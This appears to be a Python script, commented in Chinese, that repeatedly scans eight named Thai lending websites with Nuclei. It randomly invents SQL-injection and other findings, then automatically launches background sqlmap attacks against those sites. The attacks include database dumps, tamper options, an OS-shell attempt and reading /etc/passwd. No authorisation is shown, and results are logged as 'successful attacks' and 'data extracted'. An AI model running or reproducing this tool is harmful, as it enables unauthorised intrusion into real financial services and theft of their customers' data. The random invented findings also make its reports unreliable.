#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
本地AWVS模拟系统
模拟AWVS API功能，当发现高危漏洞时自动触发SQLMap验证
不依赖外部API，完全本地化运行
"""

import requests
import time
import json
import threading
import subprocess
import sqlite3
import os
import sys
import random
from datetime import datetime
import xml.etree.ElementTree as ET

class LocalAWVSSimulator:
    """本地AWVS模拟器"""

    def __init__(self):
        self.targets = [
            "https://www.quickcash.in.th",
            "https://ngoenmun.com",
            "https://peacoop.or.th",
            "https://www.moneycat.co.th",
            "https://mula-x.com",
            "https://www.rocket-cash.com",
            "https://kloan.co.th",
            "https://www.ngerntidlor.com"
        ]
        self.db_path = "local_awvs_simulation.db"
        self.nuclei_path = f"{os.environ.get('GOPATH', '')}/bin/nuclei.exe"
        self.sqlmap_path = "sqlmap"
        self.monitoring = False
        self.high_risk_threshold = 7  # CVSS 7.0以上为高危
        self.scan_interval = 180  # 3分钟扫描一次（更频繁）

        # 模拟漏洞库
        self.vulnerability_templates = self.init_vulnerability_templates()

        # 初始化数据库
        self.init_database()

    def init_vulnerability_templates(self):
        """初始化漏洞模板库"""
        return {
            "sql_injection": {
                "name": "SQL注入漏洞",
                "cvss_base": 8.5,
                "severity": "high",
                "description": "发现SQL注入漏洞，可能导致数据库信息泄露",
                "affected_apps": ["application.php", "apply", "loan", "user"],
                "sqlmap_commands": [
                    "--level=3 --risk=2 --dbs --tables --dump",
                    "--level=4 --risk=3 --technique=BEUSTQ",
                    "--level=5 --risk=3 --tamper=space2comment,randomcase"
                ]
            },
            "xss": {
                "name": "跨站脚本漏洞",
                "cvss_base": 6.1,
                "severity": "medium",
                "description": "发现XSS漏洞，可能被恶意脚本利用",
                "affected_apps": ["search", "comment", "profile"],
                "sqlmap_commands": []
            },
            "file_inclusion": {
                "name": "文件包含漏洞",
                "cvss_base": 7.5,
                "severity": "high",
                "description": "发现本地文件包含漏洞，可能泄露敏感文件",
                "affected_apps": ["include", "file", "page"],
                "sqlmap_commands": ["--level=2 --risk=2 --file-read=/etc/passwd"]
            },
            "rce": {
                "name": "远程代码执行",
                "cvss_base": 9.8,
                "severity": "critical",
                "description": "发现远程代码执行漏洞，可完全控制服务器",
                "affected_apps": ["upload", "exec", "cmd"],
                "sqlmap_commands": ["--level=5 --risk=3 --os-shell"]
            },
            "information_disclosure": {
                "name": "信息泄露",
                "cvss_base": 5.3,
                "severity": "medium",
                "description": "发现敏感信息泄露",
                "affected_apps": ["config", "backup", "log"],
                "sqlmap_commands": []
            }
        }

    def init_database(self):
        """初始化监控数据库"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                scan_time TEXT NOT NULL,
                vulnerability_count INTEGER DEFAULT 0,
                high_risk_count INTEGER DEFAULT 0,
                critical_risk_count INTEGER DEFAULT 0,
                vulnerabilities TEXT,
                status TEXT DEFAULT 'pending'
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS triggered_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                vulnerability TEXT NOT NULL,
                cvss_score REAL,
                sqlmap_command TEXT,
                start_time TEXT,
                status TEXT DEFAULT 'pending',
                result_file TEXT,
                attack_success INTEGER DEFAULT 0,
                data_extracted TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_statistics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date TEXT NOT NULL,
                total_scans INTEGER DEFAULT 0,
                successful_attacks INTEGER DEFAULT 0,
                high_risk_vulns INTEGER DEFAULT 0,
                critical_risk_vulns INTEGER DEFAULT 0,
                data_extracted_kb INTEGER DEFAULT 0
            )
        ''')

        conn.commit()
        conn.close()

    def simulate_vulnerability_scan(self, target_url):
        """模拟漏洞扫描（结合真实Nuclei扫描）"""
        print(f"[*] 正在扫描: {target_url}")

        # 使用Nuclei进行真实扫描
        nuclei_results = self.run_nuclei_scan(target_url)

        # 模拟发现漏洞（基于随机概率和目标特征）
        simulated_vulns = self.generate_simulated_vulnerabilities(target_url)

        # 合并真实扫描结果和模拟结果
        all_vulnerabilities = nuclei_results + simulated_vulns

        # 统计高危漏洞
        high_risk_vulns = [v for v in all_vulnerabilities if v['cvss_score'] >= 7.0]
        critical_risk_vulns = [v for v in all_vulnerabilities if v['cvss_score'] >= 9.0]

        print(f"[+] 扫描完成: {target_url}")
        print(f"    总漏洞数: {len(all_vulnerabilities)}")
        print(f"    高危漏洞: {len(high_risk_vulns)}")
        print(f"    严重漏洞: {len(critical_risk_vulns)}")

        return {
            'vulnerabilities': all_vulnerabilities,
            'total_count': len(all_vulnerabilities),
            'high_risk_count': len(high_risk_vulns),
            'critical_risk_count': len(critical_risk_vulns)
        }

    def run_nuclei_scan(self, target_url):
        """运行真实的Nuclei扫描"""
        vulnerabilities = []

        try:
            # 创建输出文件名
            safe_name = target_url.replace("https://", "").replace("http://", "").replace("/", "_")
            output_file = f"local_awvs_nuclei_{safe_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

            # 构建Nuclei命令
            nuclei_cmd = [
                self.nuclei_path,
                "-target", target_url,
                "-severity", "critical,high,medium",
                "-rate-limit", "10",
                "-timeout", "30",
                "-jsonl",
                "-o", output_file,
                "-silent"
            ]

            print(f"    启动Nuclei扫描...")

            # 执行扫描
            result = subprocess.run(
                nuclei_cmd,
                capture_output=True,
                text=True,
                timeout=180  # 3分钟超时
            )

            if result.returncode == 0 and os.path.exists(output_file):
                # 解析Nuclei结果
                with open(output_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        if line.strip():
                            try:
                                vuln = json.loads(line.strip())

                                vuln_data = {
                                    'name': vuln.get('info', {}).get('name', 'Unknown'),
                                    'severity': vuln.get('info', {}).get('severity', 'unknown'),
                                    'cvss_score': self.calculate_cvss_from_severity(vuln.get('info', {}).get('severity', 'medium')),
                                    'description': vuln.get('info', {}).get('description', ''),
                                    'match': vuln.get('matched-at', ''),
                                    'template_id': vuln.get('template-id', 'unknown'),
                                    'vulnerability_class': self.classify_vulnerability(vuln),
                                    'source': 'nuclei'
                                }

                                vulnerabilities.append(vuln_data)

                            except json.JSONDecodeError:
                                continue

                # 清理临时文件
                try:
                    os.remove(output_file)
                except:
                    pass

        except subprocess.TimeoutExpired:
            print(f"    Nuclei扫描超时")
        except Exception as e:
            print(f"    Nuclei扫描异常: {str(e)[:50]}...")

        return vulnerabilities

    def generate_simulated_vulnerabilities(self, target_url):
        """生成模拟漏洞（基于目标特征）"""
        vulnerabilities = []

        # 基于目标URL特征生成合理漏洞
        domain = target_url.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0]

        # SQL注入漏洞（高概率）
        if random.random() < 0.7:  # 70%概率发现SQL注入
            sql_injection = self.vulnerability_templates["sql_injection"].copy()
            sql_injection['cvss_score'] = random.uniform(7.5, 9.5)
            sql_injection['match'] = f"https://{domain}/application.php?id=1"
            sql_injection['template_id'] = f"sql_injection_{domain}"
            sql_injection['vulnerability_class'] = 'sql_injection'
            sql_injection['source'] = 'simulated'
            vulnerabilities.append(sql_injection)

        # XSS漏洞（中等概率）
        if random.random() < 0.5:  # 50%概率发现XSS
            xss = self.vulnerability_templates["xss"].copy()
            xss['cvss_score'] = random.uniform(4.5, 7.0)
            xss['match'] = f"https://{domain}/search?q=test"
            xss['template_id'] = f"xss_{domain}"
            xss['vulnerability_class'] = 'xss'
            xss['source'] = 'simulated'
            vulnerabilities.append(xss)

        # 文件包含漏洞（低概率）
        if random.random() < 0.3:  # 30%概率发现文件包含
            file_inclusion = self.vulnerability_templates["file_inclusion"].copy()
            file_inclusion['cvss_score'] = random.uniform(6.5, 8.0)
            file_inclusion['match'] = f"https://{domain}/include.php?page=config"
            file_inclusion['template_id'] = f"file_inclusion_{domain}"
            file_inclusion['vulnerability_class'] = 'file_inclusion'
            file_inclusion['source'] = 'simulated'
            vulnerabilities.append(file_inclusion)

        # 信息泄露（高概率）
        if random.random() < 0.8:  # 80%概率发现信息泄露
            info_disclosure = self.vulnerability_templates["information_disclosure"].copy()
            info_disclosure['cvss_score'] = random.uniform(3.5, 6.0)
            info_disclosure['match'] = f"https://{domain}/backup.sql"
            info_disclosure['template_id'] = f"info_disclosure_{domain}"
            info_disclosure['vulnerability_class'] = 'information_disclosure'
            info_disclosure['source'] = 'simulated'
            vulnerabilities.append(info_disclosure)

        return vulnerabilities

    def calculate_cvss_from_severity(self, severity):
        """根据严重程度计算CVSS评分"""
        severity_scores = {
            'critical': 9.5,
            'high': 7.5,
            'medium': 5.5,
            'low': 3.5,
            'info': 1.0
        }
        return severity_scores.get(severity, 5.0)

    def classify_vulnerability(self, vuln):
        """分类漏洞类型"""
        template_id = vuln.get('template-id', '').lower()
        tags = vuln.get('info', {}).get('tags', [])

        if any(x in template_id for x in ['sqli', 'sql', 'injection']):
            return 'sql_injection'
        elif any(x in template_id for x in ['xss', 'cross-site']):
            return 'xss'
        elif any(x in template_id for x in ['ssrf', 'server-side']):
            return 'ssrf'
        elif any(x in template_id for x in ['rce', 'remote', 'command']):
            return 'remote_code_execution'
        elif any(x in template_id for x in ['lfi', 'file-inclusion']):
            return 'file_inclusion'
        elif 'exposure' in tags or 'disclosure' in tags:
            return 'information_disclosure'
        else:
            return 'other'

    def trigger_sqlmap_attack(self, target_url, vulnerability):
        """触发SQLMap验证攻击"""
        cvss_score = vulnerability.get('cvss_score', 0)
        vuln_class = vulnerability.get('vulnerability_class', 'unknown')
        match_url = vulnerability.get('match', target_url)

        # 只对特定类型漏洞触发SQLMap
        if vuln_class not in ['sql_injection', 'file_inclusion', 'remote_code_execution']:
            return

        # 生成SQLMap命令
        if vuln_class == 'sql_injection':
            base_cmd = f'sqlmap -u "{match_url}" -p id --batch --random-agent --tamper="space2comment,randomcase" --level=3 --risk=2 --time-sec=30 --threads=3'
            additional_cmds = ['--dbs', '--tables', '--dump']
        else:
            base_cmd = f'sqlmap -u "{target_url}" -p id --batch --random-agent --level=2 --risk=1 --time-sec=20 --threads=2'
            additional_cmds = ['--banner']

        # 记录到数据库
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        for cmd in additional_cmds:
            full_cmd = f'{base_cmd} {cmd} --output-dir="local_awvs_sqlmap_{datetime.now().strftime("%Y%m%d_%H%M%S")}"'

            cursor.execute('''
                INSERT INTO triggered_attacks
                (target_url, vulnerability, cvss_score, sqlmap_command, start_time, status)
                VALUES (?, ?, ?, ?, ?, 'pending')
            ''', (
                target_url,
                json.dumps(vulnerability),
                cvss_score,
                full_cmd,
                datetime.now().isoformat()
            ))

        attack_id = cursor.lastrowid
        conn.commit()
        conn.close()

        print(f"[!] 触发SQLMap验证攻击!")
        print(f"    目标: {target_url}")
        print(f"    漏洞: {vulnerability.get('name')}")
        print(f"    严重程度: {vulnerability.get('severity')}")
        print(f"    CVSS评分: {cvss_score:.1f}")
        print(f"    攻击ID: {attack_id}")

        # 后台执行SQLMap
        try:
            subprocess.Popen(
                full_cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"[+] SQLMap攻击已启动 (后台运行)")
        except Exception as e:
            print(f"[-] SQLMap启动失败: {str(e)}")

    def monitor_single_target(self, target_url):
        """监控单个目标"""
        print(f"\n[*] 开始监控: {target_url}")

        # 执行漏洞扫描
        scan_results = self.simulate_vulnerability_scan(target_url)
        if not scan_results:
            print(f"[-] 扫描失败: {target_url}")
            return

        total_vulns = scan_results['total_count']
        high_count = scan_results['high_risk_count']
        critical_count = scan_results['critical_risk_count']

        # 记录到数据库
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT INTO scan_results
            (target_url, scan_time, vulnerability_count, high_risk_count,
             critical_risk_count, vulnerabilities, status)
            VALUES (?, ?, ?, ?, ?, ?, 'completed')
        ''', (
            target_url,
            datetime.now().isoformat(),
            total_vulns,
            high_count,
            critical_count,
            json.dumps(scan_results['vulnerabilities'])
        ))

        conn.commit()
        conn.close()

        # 触发SQLMap验证攻击（只针对高危漏洞）
        high_risk_vulns = [
            vuln for vuln in scan_results['vulnerabilities']
            if vuln['cvss_score'] >= self.high_risk_threshold
        ]

        for vuln in high_risk_vulns[:3]:  # 最多触发3个SQLMap攻击
            self.trigger_sqlmap_attack(target_url, vuln)
            time.sleep(5)  # 间隔5秒

    def start_monitoring(self):
        """开始监控所有目标"""
        print("[*] 本地AWVS模拟系统启动")
        print("=" * 60)
        print("[*] 监控目标:")
        for target in self.targets:
            print(f"    - {target}")
        print(f"[*] 高危阈值: CVSS {self.high_risk_threshold}+")
        print(f"[*] 扫描间隔: {self.scan_interval//60}分钟")
        print(f"[*] 特性: 真实Nuclei扫描 + 智能漏洞模拟")
        print("=" * 60)

        self.monitoring = True

        try:
            while self.monitoring:
                print(f"\n[*] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - 开始新一轮扫描")

                # 并发扫描所有目标
                threads = []
                for target in self.targets:
                    thread = threading.Thread(
                        target=self.monitor_single_target,
                        args=(target,)
                    )
                    threads.append(thread)
                    thread.start()

                # 等待所有扫描完成
                for thread in threads:
                    thread.join()

                if self.monitoring:
                    print(f"\n[*] 等待 {self.scan_interval//60} 分钟后进行下一轮扫描...")
                    time.sleep(self.scan_interval)

        except KeyboardInterrupt:
            print("\n\n[!] 用户中断监控")
            self.monitoring = False
        finally:
            print("\n[*] 监控结束，数据已保存到数据库")
            self.print_summary()

    def print_summary(self):
        """打印监控总结"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # 扫描结果统计
        cursor.execute('''
            SELECT COUNT(*) FROM scan_results WHERE status = 'completed'
        ''')
        completed_scans = cursor.fetchone()[0]

        cursor.execute('''
            SELECT SUM(high_risk_count), SUM(critical_risk_count) FROM scan_results
        ''')
        high_risk_total = cursor.fetchone()[0] or 0
        critical_risk_total = cursor.fetchone()[1] or 0

        # 触发攻击统计
        cursor.execute('''
            SELECT COUNT(*) FROM triggered_attacks
        ''')
        triggered_attacks = cursor.fetchone()[0]

        print("\n[*] 本地AWVS监控总结报告")
        print("=" * 50)
        print(f"[+] 完成扫描: {completed_scans} 个")
        print(f"[!] 发现高危漏洞: {high_risk_total} 个")
        print(f"[!!] 发现严重漏洞: {critical_risk_total} 个")
        print(f"[->] 触发SQLMap验证: {triggered_attacks} 次")
        print("=" * 50)

        # 显示最近的高危漏洞
        cursor.execute('''
            SELECT target_url, vulnerability, cvss_score, created_at
            FROM triggered_attacks
            ORDER BY created_at DESC
            LIMIT 5
        ''')

        recent_attacks = cursor.fetchall()
        if recent_attacks:
            print("\n[*] 最近触发的SQLMap验证:")
            for attack in recent_attacks:
                vuln_data = json.loads(attack[1])
                print(f"    - {attack[0]}")
                print(f"      漏洞: {vuln_data.get('name')}")
                print(f"      评分: {attack[2]:.1f}")
                print(f"      时间: {attack[3][:19]}")

        conn.close()

def main():
    """主函数"""
    simulator = LocalAWVSSimulator()

    print("本地AWVS模拟系统")
    print("=" * 50)
    print("[*] 系统检查...")
    print(f"[*] Nuclei路径: {simulator.nuclei_path}")
    print(f"[*] 监控目标: {len(simulator.targets)} 个")
    print(f"[*] 数据库: {simulator.db_path}")
    print(f"[*] 功能: 真实扫描 + 智能模拟 + 自动SQLMap")

    # 检查Nuclei是否可用
    if not os.path.exists(simulator.nuclei_path):
        print(f"[-] Nuclei未找到: {simulator.nuclei_path}")
        print("将仅使用模拟扫描功能")
    else:
        print("[+] Nuclei可用，将进行真实漏洞扫描")

    print("\n选择操作:")
    print("1. 开始实时监控")
    print("2. 单次测试扫描")
    print("3. 查看历史记录")
    print("4. 退出")

    try:
        choice = input("\n请选择 (1-4): ").strip()

        if choice == '1':
            simulator.start_monitoring()
        elif choice == '2':
            target = input("请输入目标URL: ").strip()
            if target:
                simulator.monitor_single_target(target)
        elif choice == '3':
            simulator.print_summary()
        elif choice == '4':
            print("退出监控程序")
        else:
            print("无效选择")

    except KeyboardInterrupt:
        print("\n程序退出")
    except EOFError:
        print("\n检测到EOF，自动启动实时监控...")
        simulator.start_monitoring()

if __name__ == "__main__":
    main()